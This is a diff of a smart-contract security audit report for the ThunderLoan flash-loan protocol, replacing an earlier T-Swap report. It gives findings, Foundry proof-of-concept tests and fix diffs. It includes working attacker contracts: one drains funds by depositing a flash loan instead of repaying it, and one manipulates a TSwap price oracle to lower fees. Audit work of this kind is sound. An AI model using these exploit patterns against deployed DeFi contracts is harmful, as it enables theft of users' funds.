@@ -1,7 +1,7 @@
 ---
 title: Protocol Audit Report
 author: Seven Cedars
-date: May 23, 2024
+date: June 4, 2024
 header-includes:
   - \usepackage{titling}
   - \usepackage{graphicx}
@@ -19,7 +19,7 @@ NB: remeber to run this in the audit_data folder!
         \includegraphics[width=0.5\textwidth]{logo.pdf} 
     \end{figure}
     \vspace*{2cm}
-    {\Huge\bfseries T-Swap Audit Report\par}
+    {\Huge\bfseries ThunderLoan Audit Report\par}
     \vspace{1cm}
     {\Large Version 1.0\par}
     \vspace{2cm}
@@ -48,9 +48,12 @@ Lead Auditors: Seven Cedars
 - [Findings](#findings)
 
 # Protocol Summary
+The ThunderLoan protocol is meant to do the following:
 
-This project is meant to be a permissionless way for users to swap assets between each other at a fair price. You can think of T-Swap as a decentralized asset/token exchange (DEX). 
-T-Swap is known as an [Automated Market Maker (AMM)](https://chain.link/education-hub/what-is-an-automated-market-maker-amm) because it doesn't use a normal "order book" style exchange, instead it uses "Pools" of an asset. 
+1. Give users a way to create flash loans
+2. Give liquidity providers a way to earn money off their capital
+   
+Liquidity providers can `deposit` assets into `ThunderLoan` and be given `AssetTokens` in return. These `AssetTokens` gain interest over time depending on how often people take out flash loans. 
 
 # Disclaimer
 
@@ -70,536 +73,645 @@ We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate
 # Audit Details 
 
 ## Scope 
-```javascript
-./src/
-#-- PoolFactory
-#-- TSwapPool.sol
+- Commit Hash: 8803f851f6b37e99eab2e94b4690c8b70e26b3f6
+- In Scope:
 ```
+#-- interfaces
+|   #-- IFlashLoanReceiver.sol
+|   #-- IPoolFactory.sol
+|   #-- ITSwapPool.sol
+|   #-- IThunderLoan.sol
+#-- protocol
+|   #-- AssetToken.sol
+|   #-- OracleUpgradeable.sol
+|   #-- ThunderLoan.sol
+#-- upgradedProtocol
+    #-- ThunderLoanUpgraded.sol
+```
+- Solc Version: 0.8.20
+- Chain(s) to deploy contract to: Ethereum
+- ERC20s:
+  - USDC 
+  - DAI
+  - LINK
+  - WETH
 
 ## Roles
-- Liquidity Providers: Users who have liquidity deposited into the pools. Their shares are represented by the LP ERC20 tokens. They gain a 0.3% fee every time a swap is made. 
-- Users: Users who want to swap tokens.
+- Owner: The owner of the protocol who has the power to upgrade the implementation. 
+- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
+- User: A user who takes out flash loans from the protocol.
   
 # Executive Summary
 
 | Severity | Number of Issues found |
 | -------- | ---------------------- |
-| high     | 4                      |
+| high     | 3                      |
 | medium   | 2                      |
 | low      | 2                      |
-| info     | 11                     |
-| total    | 19                     |
+| info     | 7                      |
+| gas      | 1                      |
+| total    | 15                     |
 
 
 ## Issues found
 # Findings
 
 ## High
-### [H-1] Incorrect fee calculation in `TSwapPool::getInputAmountBasedOnOutput` causes protol to take too many tokens from users, resulting in lost fees.
+### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees that is actually the case, that blocks redemptions and incorrectly sets the exchange rate. 
 
-**Description:** The `getInputAmountBasedOnOutput` function is intended to calculate the amount of tokens a user should deposit given an amount of tokens of output tokens. However, the function currently miscalculates the amount. It scales the amount by 10_000 instead of 1_000. 
+**Description:** In the `ThunderLoan` protocol, the `exchangeRate` is used to calculate the exchange rate between assetTokens and their underlying tokens. Indirectly, it keeps track of how many fees liquidity providers should receive. 
 
-**Impact:** Protocol takes more fees than expected from users. 
-
-**Recommended Mitigation:** 
-
-```diff
- {
-- return ((inputReserves * outputAmount) * 10_000) / ((outputReserves - outputAmount) * 997);
-+ return ((inputReserves * outputAmount) * 1_000) / ((outputReserves - outputAmount) * 997);
-  } 
-```
-
-### [H-2] No Slippage protection in `TSwapPool::swapExactOutput` causes users to potentially receive way fewer tokens.
-
-**Description:** The `swapExactOutput` does not include any sort of slippage protection. This function is similar to `TSwapPool::swapExactInput` where the function specifies `minOutputAMount`. The `swapExactOutput` function should include a `maxInputAMount`. 
-
-**Impact:** If market conditions change, user might pay far more for tokens than they expected. 
-
-**Proof of Concept:**
-1. Price of 100 weth is now 100 poolToken. 
-2. User inputs `swapExactOutput` looking for 10 weth. 
-   1. inputToken = poolToken
-   2. output token = weth
-   3. output amount = 10
-   4. deadline is blocknumber. 
-3. Funciton does not offer maxInputAmount. 
-4. While transaction is in mempool. Someone swaps pooltoken for weth. - the exact same trade. 
-5. poolToken will now drop in value, meaning that user will pay more. If this happens with Huge amounts, the difference will be huge. 
-
-<details>
-<summary> PoC </summary>
-- step 1: fix finding [H-1] Incorrect fee calculation, as this render proper exchange based on output incorrect. In `TSwapPool::getInputAmountBasedOnOutput` change the following lines:
-   
-```diff
- {
-- return ((inputReserves * outputAmount) * 10_000) / ((outputReserves - outputAmount) * 997);
-+ return ((inputReserves * outputAmount) * 1_000) / ((outputReserves - outputAmount) * 997);
-  } 
-``` 
-
-Step 2: Place the dollowing in `TSwapPool.t.sol`: 
-
-```javascript
-
-    function test_lackingSlippageProtection () public {
-        vm.startPrank(liquidityProvider);
-        weth.approve(address(pool), 100e18);
-        poolToken.approve(address(pool), 100e18);
-        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
-        vm.stopPrank();
-
-        // After we swap, there will be ~110 tokenA, and ~91 WETH
-        // 100 * 100 = 10,000
-        // 110 * ~91 = 10,000
-        // meaning we should expect to pay ~11 in tokenA for ~9 in weth. 
-        uint256 expectedPayment = 11e18;
-        
-        // The liquidity provider now comes around and does a big swap poolTokens -> wEth 
-        uint256 minOutputAmount = 9e18; 
-        vm.startPrank(liquidityProvider);
-            poolToken.approve(address(pool), 100e18);
-            pool.swapExactInput(
-                poolToken, // = inputToken 
-                25e18, // = inputAMount
-                weth, // = outputToken 
-                minOutputAmount, // = outputAmount
-                uint64(block.timestamp)); // deadline
-        vm.stopPrank();
-
-        uint256 poolTokenBalanceuserBefore = poolToken.balanceOf(user); 
-        
-        vm.startPrank(user);
-        poolToken.approve(address(pool), 100e18);
-        pool.swapExactOutput(
-            poolToken, // = inputToken 
-            weth, // = outputToken 
-            9e18, // = outputAmount 
-            uint64(block.timestamp)); // deadline
-        vm.stopPrank();
-
-        uint256 poolTokenBalanceUserAfter = poolToken.balanceOf(user); 
-        console.log("Difference between expected and actual payment: ", (poolTokenBalanceuserBefore - poolTokenBalanceUserAfter) - expectedPayment); 
-
-        assert(poolTokenBalanceuserBefore - poolTokenBalanceUserAfter > expectedPayment);
-    }
-```
-</details>
-
-**Recommended Mitigation:** We should include a `maxInputAmount` so the user has a guarantee they will only spend up until a certain amount. 
-```diff
-    function swapExactOutput(
-        IERC20 inputToken,
-        IERC20 outputToken,
-        uint256 outputAmount,
-+       uint256 maxInputAmount,
-        uint64 deadline
-    )
-.
-.
-.
-        inputAmount = getInputAmountBasedOnOutput(outputAmount, inputReserves, outputReserves);
-        _swap(inputToken, inputAmount, outputToken, outputAmount);
-+ if (inputamount > maxInputAmount) {
-+  revert(); 
-+ }       
-```
-
-### [H-3] `TSwapPool::sellPoolTokens` mismatches input an doutput tokens, causing users to receive the incorrect amount of tokens. 
-
-**Description:** The `sellPoolTokens` is intended to allow users to easily sell poolTokens for weth in exchange. Users indicate how many poolTokens they are willing to sell. How the function currently miscalculates the swapped amount. 
-
-This is because the `swapExactOutput` is called, instead of the `swapExactInput`. 
-
-**Impact:** Users will swap the wrong amoung of tokens, which is a severe disruption of protocol functionality. 
-
-**Proof of Concept:**
-1. User wants to exchange 10 poolTokens. 
-2. User inputs the `sellPoolTokens` function: 
-   1. poolTokenAmount = 10
-3. Function calls `swapExactOutput`
-   1. poolToken = token to retrieve from user 
-   2. wethToken = token to send to user
-   3. ouputAmount = 10 (= amount of weth to send to user). 
-   4. uint64(block.timestamp)
-4. The amount of poolTokens is calculated on the basis of costing 10 weth, instead of sending 10 poolTokens for variable amount of weth.
-5. Resulting in incorrect swap. 
-
-<details>
-<summary> PoC </summary>
-- step 1: fix finding [H-1] Incorrect fee calculation, as this render proper exchange based on output incorrect. In `TSwapPool::getInputAmountBasedOnOutput` change the following lines:
-   
-```diff
- {
-- return ((inputReserves * outputAmount) * 10_000) / ((outputReserves - outputAmount) * 997);
-+ return ((inputReserves * outputAmount) * 1_000) / ((outputReserves - outputAmount) * 997);
-  } 
-``` 
-
-Place the dollowing in `TSwapPool.t.sol`: 
-
-```javascript
-
-   function test_incorrectAmountsAtSellPoolTokens () public {
-        vm.startPrank(liquidityProvider);
-        weth.approve(address(pool), 100e18);
-        poolToken.approve(address(pool), 100e18);
-        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
-        vm.stopPrank();
-
-        uint256 poolTokensToSell = 5e18; 
-        uint256 poolTokenBalanceUserBefore = poolToken.balanceOf(user); 
-        
-        vm.startPrank(user);
-        poolToken.approve(address(pool), 100e18);
-        weth.approve(address(pool), 100e18);
-        pool.sellPoolTokens(poolTokensToSell);
-        vm.stopPrank();
-
-        uint256 poolTokenBalanceUserAfter = poolToken.balanceOf(user); 
-
-        assert(poolTokenBalanceuserBefore - poolTokenBalanceUserAfter != poolTokensToSell);
-    }
-
-```
-</details>
-
-**Recommended Mitigation:** 
-Consider changing the implementation to use `swapExactInput` instead of `swapExactOutput`. Note that this would also require changing the `sellPoolTokens` functionality to accept a new parameter: `minWethToReceive` as it needs to be passed to `swapExactOutput`.  
-
-```diff
-    function sellPoolTokens(uint256 poolTokenAmount) external returns (uint256 wethAmount) {
--      return swapExactOutput(i_poolToken, i_wethToken, poolTokenAmount, uint64(block.timestamp));
-+      return swapExactInput(i_poolToken, poolTokenAmount,  i_wethToken, minWethToReceive, uint64(block.timestamp));
-    }
-
-Additionally, it would be good to add a deadline to the function as there currently is none.  
-
-```
-
-### [H-4] In `TSwapPool::_swap` the extra tokens goven to users after every `swapCount`, breaks the invariant of `x * y = k`. 
- 
-**Description:** The protocol follows a strict invariant of `x * y = k`. Where
-- `x`: The Balance of the pool token.
-- `y`: The Balance of the WETH 
-- `k` the contant product of the two balances. 
-
-This means that whenever the balance change in the protocol, the ration between the two amounts should remain constant. However, this is broken due to the extra incentive in the `_swap` function. It means that the funds will be drained over time.
-
-The following block of code is responsible for the issue: 
-```javascript
-        swap_count++;
-        if (swap_count >= SWAP_COUNT_MAX) {
-            swap_count = 0;
-            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
-        }
-```
-
-**Impact:** A user can drain the protocol by making many swaps. 
-
-In short, the protocols core invariant is broken.  
-
-**Proof of Concept:**
-1. The user swaps 10 times and collects the extra incentive tokens. 
-2. The user continues to swap until all the protocols funds are drained.  
-
-<details>
-<summary> PoC </summary>
+However, the `deposit` function erroneously updates this state - without collecting any fees. 
 
 ```javascript 
-    function testInvariantBroken() public {
-        vm.startPrank(liquidityProvider);
-        weth.approve(address(pool), 100e18);
-        poolToken.approve(address(pool), 100e18);
-        pool.deposit(100e18, 100e18, 100e18, uint64( block.timestamp));
-        vm.stopPrank();
+    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+        AssetToken assetToken = s_tokenToAssetToken[token];
+        uint256 exchangeRate = assetToken.getExchangeRate();
+        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
+        emit Deposit(msg.sender, token, amount);
+        assetToken.mint(msg.sender, mintAmount);
 
-        uint256 outputWeth = 1e17;
-        uint256 numberOfSwaps = 10; 
-        int256 startingY = int256(weth.balanceOf(address(pool)));
-        int256 expectedDeltaY = int256(-1) * int256(outputWeth);
+@>        uint256 calculatedFee = getCalculatedFee(token, amount);
+@>        assetToken.updateExchangeRate(calculatedFee);
+
+        token.safeTransferFrom(msg.sender, address(assetToken), amount);
+    }
+```
+
+**Impact:** There are several impacts of this bug. 
+
+1. The `redeem` function is potentially blocked because the protocol, bacause it can try to return more tokens than it has. 
+2. Rewards are incorrectly calculated, leading to users getting potentially more or less than they deserve. 
+
+**Proof of Concept:**
+1. LP depsoits
+2. User takes out a flash loan
+3. It is now possible for LP to redeem.  
+
+<details>
+<summary> Proof of Concept</summary>
+
+Place the following in `ThunderLoanTest.t.sol`
+
+```javascript
+     function testRedeemAfterLoan() public  setAllowedToken hasDeposits {
+        uint256 amountToBorrow = AMOUNT * 10;
+        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
 
         vm.startPrank(user);
-        for (uint256 i; i < numberOfSwaps; i++) {
-            poolToken.approve(address(pool), type(uint256).max);
-            pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
-        }
+        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
+        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
         vm.stopPrank();
 
-        uint256 endingY = weth.balanceOf(address(pool));
-        int256 actualDeltaY = int256(endingY) - int256(startingY);
-
-        vm.assertEq(expectedDeltaY, actualDeltaY); 
+        uint256 amountToRedeem = type(uint256).max ;
+        vm.startPrank(liquidityProvider);
+        thunderLoan.redeem(tokenA, amountToRedeem);  
     }
 ```
+
 </details>
 
-**Recommended Mitigation:** Remove the extra incentive mechanism is the most straightforward solution.
+**Recommended Mitigation:** Remove the incorrect update exchange rate lines from `deposit`. 
 
 ```diff 
--     swap_count++;
--        if (swap_count >= SWAP_COUNT_MAX) {
--            swap_count = 0;
--            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
--        }
+    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+        AssetToken assetToken = s_tokenToAssetToken[token];
+        uint256 exchangeRate = assetToken.getExchangeRate();
+        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
+        emit Deposit(msg.sender, token, amount);
+        assetToken.mint(msg.sender, mintAmount);
 
+-        uint256 calculatedFee = getCalculatedFee(token, amount);
+-        assetToken.updateExchangeRate(calculatedFee);
+
+        token.safeTransferFrom(msg.sender, address(assetToken), amount);
+    }
 ```
 
-
-## Medium 
-### [M-1] At `TSwapPool::deposit` the `deadline` parameter is set but not used. As a result, a user deposit that should fail, will pass. Severe disruption of protocol.
+### [H-2] The `ThunderLoan::deposit` function can be called with borrowed money from `ThunderLoan::flashloan`, allowing draining of all funds through taking fees and exchange rate manipulation.
 
 **Description:** 
-At the `TSwapPool::deposit` the `deadline` parameter is ignored. It means the function allows deposits even though the deadline has passed. 
+It is possible to borrow tokens via the `flashloan` function and desposit them via the `deposit` function; bypassing the `repay` function. It is possible because the protocol checks if the flashloan has been repaid by comparing the start and end balance of the token. This end balance can also be the same by depositing (instead of repaying) the token.   
 
-**Impact:**
-Transactions can be completed at moments after deadline, possibly during averse market conditions. 
-
-**Proof of Concept:** The `deadline` parameter is ignored.  
-
-**Recommended Mitigation:** 
-Include a require check to check if the deadline passed. The checks can be used in the form of already existing modifiers: 
-
-```diff
-    function deposit(
-        uint256 wethToDeposit,
-        uint256 minimumLiquidityTokensToMint,
-        uint256 maximumPoolTokensToDeposit,
-        uint64 deadline
-    )
-        external
-+       revertIfDeadlinePassed(deadline)
-        revertIfZero(wethToDeposit)
-        returns (uint256 liquidityTokensToMint)
-    {
+```javascript
+    uint256 endingBalance = token.balanceOf(address(assetToken));
+    if (endingBalance < startingBalance + fee) {
+        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
+    }
 ```
 
-### [M-2] Rebase, fee-on-transfer and ERV-777 tokens break the protocol.
+**Impact:** 
+When borrowed tokens are redeposited (instead of repaid) in this way, the value of the `assetToken` linked to the underlying is artifically increased: new `assetToken`s are minted without additional underlying tokens being added to the `ThunderLoan` contract. It results in tokens being drained from the asset pool.
 
-Any token that adds functionality to the basic transfer functionality of ERC-20 will cause the invariant of the protocol to break. 
+**Proof of Concept:**
+1. ThunderLoan has 100e18 of tokenA as asset, with 100e18 `assetToken`s as collateral.    
+2. Malicious userZero takes a flashLoan of 50e18 to external contractB. 
+3. ContractB deposits the borrowed tokens through the `deposit` function, receiving newly minted `assetToken`s. 
+4. This causes the exchange rate between the `assetToken` and the underlying token to increase.
+5. ContractB does not call the repay function, but because the ending balance is higher than starting balance; the call does not revert. 
+6. Finally, ContractB calls the `redeem` function with the its assetTokens and receives more underlying tokens than were borrowed initially. 
 
+<details>
+<summary> Proof of Concept</summary>
 
-## Low 
-### [L-1] The `TSwapPoll::LiquidityAdded` event has parameters out of order. 
+Place the following two in `ThunderLoanTest.t.sol`:  
 
-**Description:** When the `LiquidityAdded` event is emitted at the `TSwapPoll::_addLiquidityMintAndTransfer` function, the `poolTokensToDeposit` and `wethToDeposit` are swapped. 
-
-**Impact:** Event emits incorrect information, leading to off-chain functions potentially malfunctioning. 
-
-**Recommended Mitigation:** 
-
-```diff
-  emit LiquidityAdded(msg.sender, 
--   poolTokensToDeposit, wethToDeposit
-+   wethToDeposit, poolTokensToDeposit
-    );
+```javascript
+    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
+        vm.startPrank(user); 
+        uint256 amountToBorrow = 50e18; 
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan)); 
+        tokenA.mint(address(dor), fee); 
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, ""); 
+        dor.redeemMoney();
+        vm.stopPrank(); 
+        
+        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee); 
+    }
 ```
 
+As well as: 
 
-### [L-2]: At function `TSwapPool::swapExactInput` the `uint256 output` returns incorrect value . 
+```javascript
+    contract DepositOverRepay is IFlashLoanReceiver { 
+        ThunderLoan thunderLoan; 
+        AssetToken assetToken; 
+        IERC20 s_token; 
 
-**Description:** The `swapExactInput` function is expected to return the actual amount of token bought by the user. However, while it has a return parameter `output`, it is never assigned a value. It also does not use an explicit return statement. 
-
-**Impact:** The return value will always be 0. 
-
-**Proof of Concept:** 
-
-**Recommended Mitigation:** 
-
-- Found in src/TSwapPool.sol 
-
-```diff 
-        public
-        revertIfZero(inputAmount)
-        revertIfDeadlinePassed(deadline)
-        returns (
--           uint256 output
-+           uint256 outputAmount
-        )
-    {
-        uint256 inputReserves = inputToken.balanceOf(address(this));
-        uint256 outputReserves = outputToken.balanceOf(address(this));
-
-        uint256 outputAmount = getOutputAmountBasedOnInput(inputAmount, inputReserves, outputReserves);
-
-        if (outputAmount < minOutputAmount) {
-            revert TSwapPool__OutputTooLow(outputAmount, minOutputAmount);
+        constructor(address _thunderLoan) {
+            thunderLoan = ThunderLoan(_thunderLoan); 
         }
 
-        _swap(inputToken, inputAmount, outputToken, outputAmount);
-    }
-``` 
+        function executeOperation(
+            address token,
+            uint256 amount,
+            uint256 fee,
+            address /*initiator*/,
+            bytes calldata /*params*/
+        )
+            external
+            returns (bool)
+        {
+            s_token = IERC20(token); 
+            assetToken = thunderLoan.getAssetFromToken(IERC20(token)); 
+            IERC20(token).approve(address(thunderLoan), amount + fee); 
+            thunderLoan.deposit(IERC20(token), amount + fee); 
+            return true; 
+        }
 
+        function redeemMoney() public {
+            uint256 amount = assetToken.balanceOf(address(this)); 
+            thunderLoan.redeem(s_token, amount); 
+        }
+    }
+```
+
+</details>
+
+
+**Recommended Mitigation:** the `flashLoan` function needs to check if the `repay` function is called. This can be done by setting `s_currentlyFlashLoaning` to false inside the `repay` function instead of the `flashLoan` function. 
+
+Thus, at the end of `flashloan`: 
+```diff
+    uint256 endingBalance = token.balanceOf(address(assetToken));
+    if (endingBalance < startingBalance + fee) {
+        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
+    }
+-    s_currentlyFlashLoaning[token] = false;
+
+```
+
+And subsequently at `repay`: 
+```diff 
+    function repay(IERC20 token, uint256 amount) public {
+        if (!s_currentlyFlashLoaning[token]) {
+            revert ThunderLoan__NotCurrentlyFlashLoaning();
+        }
+        AssetToken assetToken = s_tokenToAssetToken[token];
+        token.safeTransferFrom(msg.sender, address(assetToken), amount);
++       s_currentlyFlashLoaning[token] = false;
+    }
+```
+
+This will cause the flashLoan to keep open as long as the token has not been actually repaid.
+
+### [H-3] Mixing up variable location causes storage collision in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol.
+
+**Description:** 
+`ThunderLoan.sol` has two storage variables in the following order: 
+
+```javascript
+    uint256 private s_feePrecision; 
+    uint256 private s_flashLoanFee; 
+```
+
+However, `ThunderLoanUpgraded.sol` has them in a different order. 
+
+```javascript
+    uint256 private s_flashLoanFee;  
+    uint256 public constant FEE_PRECISION = 1e18;
+```
+
+Due to how solidity storage works, after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the position of storage variables, and removing storage variables for constant variables, also breaks storage location. 
+
+**Impact:** 
+After the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. As a result, users will pay the wrong fee. Worse, the `s_currentlyFlashLoaning` starts in the wrong stroage slot, breaking the protocol. 
+
+**Proof of Concept:**
+1. Initial contract is deployed. 
+2. Owner of contract deploys upgrade. 
+3. Fee structure breaks.  
+
+<detail> 
+<summary> Proof of Concept </summary> 
+
+Place the following in `ThunderLoanTest.t.sol`. 
+
+```javascript
+    import { ThunderLoanUpgraded } from  "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
+
+    function testUpgradesBreaks() public {
+        uint256 feeBeforeUpgrade = thunderLoan.getFee(); 
+        vm.startPrank(thunderLoan.owner()); 
+        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
+        thunderLoan.upgradeToAndCall(address(upgraded), ""); 
+        uint256 feeAfterUpgrade = thunderLoan.getFee(); 
+        vm.stopPrank(); 
+
+        console2.log("fee before upgrade:", feeBeforeUpgrade);  
+        console2.log("fee after upgrade:", feeAfterUpgrade); 
+
+        assert(feeBeforeUpgrade != feeAfterUpgrade); 
+    }  
+```
+
+You can also see the storage difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`. 
+</detail>
+
+**Recommended Mitigation:** If you must remove the storage variable, leave it blank to avoid mixing storage slots.  
+
+```diff 
+-    uint256 private s_flashLoanFee; 
+-    uint256 public constant FEE_PRECISION = 1e18;
++    int256 private s_blank;
++    int256 private s_flashLoanFee;
++    uint256 public constant FEE_PRECISION = 1e18;
+
+```
+
+## Medium 
+
+### [M-1] Using Tswap as price Oracle allows for Oracle manipulation and to users being able to get lower borrowing fees. 
+
+**Description:** At `getCalculatedFee` the fee is calculated in wrappedEthed (Weth), using the `TSwap` protocol as price Oracle. However, the exchange rate at `TSwap` can be manipulated by adding (borrowed) tokens to the `Tswap` exchange pool.  
+
+**Impact:** As the exchange rate at the `TSwap` protocol is artifically decreased, a user will pay lower fees for their flashloan.  
+
+**Proof of Concept:**
+1. Malicious user takes out a first flashLoan of TokenA. 
+2. The user deposits the flashloan to the `Tswap` protocol. 
+3. Malicious user takes out a second flashloan of TokanA. 
+4. The user pays far lower fees for the second flashloan.   
+5. On average the user paid lower fees than they would other wise have. 
+
+<detail> 
+<summary> Proof of Concept </summary> 
+
+Place the following code in `ThunderLoanTest.t.sol`.
+
+```javascript
+    function testOracleManipulation() public {
+        thunderLoan = new ThunderLoan(); 
+        tokenA = new ERC20Mock(); 
+        proxy = new ERC1967Proxy(address(thunderLoan), ""); 
+        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth)); 
+        address tswapPool = pf.createPool(address(tokenA)); 
+
+        thunderLoan = ThunderLoan(address(proxy));
+        thunderLoan.initialize(address(pf)); 
+
+        // 2. fund tswap
+        vm.startPrank(liquidityProvider); 
+        tokenA.mint(liquidityProvider, 100e18); 
+        tokenA.approve(address(tswapPool), 100e18); 
+        weth.mint(liquidityProvider, 100e18); 
+        weth.approve(address(tswapPool), 100e18); 
+        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp); 
+        vm.stopPrank();
+        // ratio = 1 to 1. 
+
+        // 3. fund Thunderloan
+        vm.prank(thunderLoan.owner());
+        thunderLoan.setAllowedToken(tokenA, true); 
+        
+        vm.startPrank(liquidityProvider);
+        tokenA.mint(liquidityProvider, 1000e18); 
+        tokenA.approve(address(thunderLoan), 1000e18); 
+        thunderLoan.deposit(tokenA, 1000e18); 
+        vm.stopPrank();
+
+        // 4. get two flashloans. 
+        //     a. to influence price of weth/tokenA on Tswap 
+        //     b. to show that doing this results in reduced fees on thunderloan. 
+        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18); 
+        console2.log("normal fee is: ", normalFeeCost); 
+        //0.296147410319118389 
+
+        uint256 amountToBorrow = 50e18; 
+        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
+            address(tswapPool), 
+            address(thunderLoan),
+            address(thunderLoan.getAssetFromToken(tokenA)) 
+        );
+
+        vm.startPrank(user); 
+        tokenA.mint(address(flr), 100e18); 
+        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, ""); 
+        vm.stopPrank(); 
+
+        uint256 attackFee = flr.feeOne() + flr.feeTwo(); 
+        console2.log("attack fee is:", attackFee); 
+
+        assert(attackFee < normalFeeCost); 
+    }
+```
+
+As well as the attack contract: 
+
+```javascript
+contract MaliciousFlashLoanReceiver is IFlashLoanReceiver { 
+    ThunderLoan thunderLoan; 
+    address repayAddress; 
+    BuffMockTSwap tswapPool; 
+    bool attacked; 
+    uint256 public feeOne; 
+    uint256 public feeTwo; 
+
+    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
+        tswapPool = BuffMockTSwap(_tswapPool); 
+        thunderLoan = ThunderLoan(_thunderLoan); 
+        repayAddress = _repayAddress; 
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address /*initiator*/,
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        if (!attacked) {
+            feeOne = fee;
+            attacked = true; 
+            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18); 
+            IERC20(token).approve(address(tswapPool), 50e18); 
+            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp); 
+            // this tanks the price. 
+
+            // now getting a second flashloan. 
+            thunderLoan.flashloan(address(this), IERC20(token), amount, ""); 
+            // repay
+            // IERC20(token).approve(address(thunderLoan), amount + fee); 
+            // thunderLoan.repay(IERC20(token), amount + fee); 
+            IERC20(token).transfer(address(repayAddress), amount + fee); 
+
+        } else {
+            // calculate fee -> to compare with previous fee. 
+            feeTwo = fee; 
+            // repay
+            // IERC20(token).approve(address(thunderLoan), amount + fee); 
+            // thunderLoan.repay(IERC20(token), amount + fee); 
+            IERC20(token).transfer(address(repayAddress), amount + fee); 
+        }
+        return true; 
+    }
+}
+
+```
+
+</detail>
+
+**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle. This will involve some considerable refactoring of the code base. 
+
+### [M-2] `ThunderLoan::getCalculatedFee` calculates the fee in weth, but subsequently combines it with token amounts in payments. It results in users paying incorrect fees. 
+
+**Description:** The `getCalculatedFee` function calculates fees in weth: 
+
+```javascript
+    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
+    fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
+```
+
+However, this fee is collected as a token - not as weth - in the `flashloan` function: 
+```javascript
+    if (endingBalance < startingBalance + fee) {
+        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
+    }
+```
+
+**Impact:** The fees paid by users will be incorrect any time the exchange rate between weth and the token is not 1 to 1.  
+
+**Recommended Mitigation:** Remove calculation of fees in weth. Have users pay their fees in the token that is borrowed. This also resolves any issues with price manipulation mentioned in issue [M-1] discussed above.
+
+## Low 
+### [L-1]: Centralization Risk for trusted owners
+
+The protocol restricts function by owner: giving a single owner privileged rights to perform admin tasks. As a consequence, the owner needs to be trusted to not perform malicious updates or drain funds.
+
+<details><summary>6 Found Instances</summary>
+- Found in src/protocol/ThunderLoan.sol [Line: 264](src/protocol/ThunderLoan.sol#L264)
+
+	```javascript
+	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
+	```
+
+- Found in src/protocol/ThunderLoan.sol [Line: 299](src/protocol/ThunderLoan.sol#L299)
+
+	```javascript
+	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
+	```
+
+- Found in src/protocol/ThunderLoan.sol [Line: 329](src/protocol/ThunderLoan.sol#L329)
+
+	```javascript
+	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
+	```
+
+- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 238](src/upgradedProtocol/ThunderLoanUpgraded.sol#L238)
+
+	```javascript
+	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
+	```
+
+- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 264](src/upgradedProtocol/ThunderLoanUpgraded.sol#L264)
+
+	```javascript
+	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
+	```
+
+- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 287](src/upgradedProtocol/ThunderLoanUpgraded.sol#L287)
+
+	```javascript
+	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
+	```
+
+</details>
+
+### [L-2]: Initialisation can be front run. 
+
+**Description:** By front running the initialise function, someone other than the deployer of the contract can initialize the contract. 
+
+**Impact:** An unintended (malicious) user can take ownership of the contract at initialisation.  
+
+**Recommended Mitigation:** Deploy and initialise through the same function. This is currently already done in the [DeployThunderLoan] script.
 
 
 ## Informational 
-### [I-1]: `public` functions not used internally should be marked `external`, to save gas. 
 
-Instead of marking a function as `public`, consider marking it as `external` if it is not used internally. 
